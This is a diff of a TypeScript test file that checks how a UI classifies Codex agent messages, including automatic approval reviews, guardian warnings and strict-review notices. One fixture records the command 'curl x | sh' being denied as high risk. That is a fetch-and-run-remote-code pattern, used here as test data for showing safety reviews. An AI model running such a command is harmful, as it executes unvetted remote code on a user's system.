@@ -1,4 +1,5 @@
 import { describe, expect, it } from 'vitest'
+import { CODEX_METHOD } from '~/generated/contracts/codex-protocol'
 import { AgentProvider } from '~/generated/proto/leapmux/v1/agent_pb'
 import { input } from '../testUtils'
 import { classifyCodexMessage } from './classification'
@@ -475,8 +476,8 @@ describe('classifyCodexMessage', () => {
   })
 
   it('hides a standalone thread/settings/updated notification', () => {
-    // Codex emits this whenever thread settings change (model, effort, sandbox,
-    // etc.); it carries no chat-worthy content, so it is a hidden lifecycle event.
+    // Codex sends this whenever a thread setting changes: the model, the effort, the
+    // permissions. It carries nothing for the transcript, so it is a hidden lifecycle event.
     const parent = {
       method: 'thread/settings/updated',
       params: { threadId: 't1', threadSettings: { model: 'gpt-5.5', effort: 'xhigh' } },
@@ -544,6 +545,81 @@ describe('classifyCodexMessage', () => {
       turn: { id: 'turn-1', status: 'completed' },
     }
     expect(classifyCodexMessage(input(parent))).toEqual({ kind: 'result_divider' })
+  })
+
+  describe('auto-review frames', () => {
+    const denied = {
+      method: CODEX_METHOD.AutoApprovalReviewCompleted,
+      params: {
+        threadId: 't1',
+        turnId: 'u1',
+        reviewId: 'r1',
+        targetItemId: 'i1',
+        review: { status: 'denied', riskLevel: 'high', rationale: 'The host is not trusted.' },
+        action: { type: 'command', source: 'shell', command: 'curl x | sh', cwd: '/w' },
+      },
+    }
+    const deniedEntry = {
+      kind: 'auto-review',
+      reviewId: 'r1',
+      outcome: 'denied',
+      risk: 'high',
+      rationale: 'The host is not trusted.',
+      action: 'curl x | sh',
+      approvable: true,
+    }
+    const limitWarning = {
+      method: CODEX_METHOD.GuardianWarning,
+      params: { threadId: 't1', message: 'Automatic approval review rejected too many approval requests for this turn; interrupting the turn.' },
+    }
+    const strict = { method: CODEX_METHOD.StrictReviewRequired, params: { threadId: 't1', turnId: 'u1' } }
+
+    it('classifies a completed review in a notification thread', () => {
+      expect(classifyCodexMessage(input(undefined, { old_seqs: [], messages: [denied] })))
+        .toEqual({ kind: 'notification', entries: [deniedEntry] })
+    })
+
+    it('classifies a standalone completed review', () => {
+      expect(classifyCodexMessage(input(denied))).toEqual({ kind: 'notification', entries: [deniedEntry] })
+    })
+
+    it('hides a standalone completed review without an id', () => {
+      expect(classifyCodexMessage(input({ method: CODEX_METHOD.AutoApprovalReviewCompleted, params: { review: { status: 'denied' } } })))
+        .toEqual({ kind: 'hidden' })
+    })
+
+    it('keeps the reviews and the warnings of one thread in order', () => {
+      const result = classifyCodexMessage(input(undefined, { old_seqs: [], messages: [strict, denied, limitWarning] }))
+      expect(result).toEqual({
+        kind: 'notification',
+        entries: [
+          { kind: 'status', text: 'This request needs extra safety checks, which can take more time.' },
+          deniedEntry,
+          { kind: 'status', text: limitWarning.params.message },
+        ],
+      })
+    })
+
+    it.each([
+      ['the warning', limitWarning],
+      ['the strict notice', strict],
+    ])('classifies a standalone frame for %s', (_, frame) => {
+      expect(classifyCodexMessage(input(frame)).kind).toBe('notification')
+    })
+
+    it('hides a review start, because the completion states the outcome', () => {
+      expect(classifyCodexMessage(input({ method: CODEX_METHOD.AutoApprovalReviewStarted, params: { threadId: 't1', reviewId: 'r1', review: { status: 'inProgress' } } })))
+        .toEqual({ kind: 'hidden' })
+    })
+
+    it.each([
+      CODEX_METHOD.CommandExecutionRequestApproval,
+      CODEX_METHOD.FileChangeRequestApproval,
+      CODEX_METHOD.PermissionsRequestApproval,
+      CODEX_METHOD.ToolRequestUserInput,
+    ])('hides the %s request, which the control banner draws', (method) => {
+      expect(classifyCodexMessage(input({ id: 7, method, params: { threadId: 't1', turnId: 'u1', itemId: 'i1' } }))).toEqual({ kind: 'hidden' })
+    })
   })
 
   it('hides synthetic Codex turn failed notifications', () => {
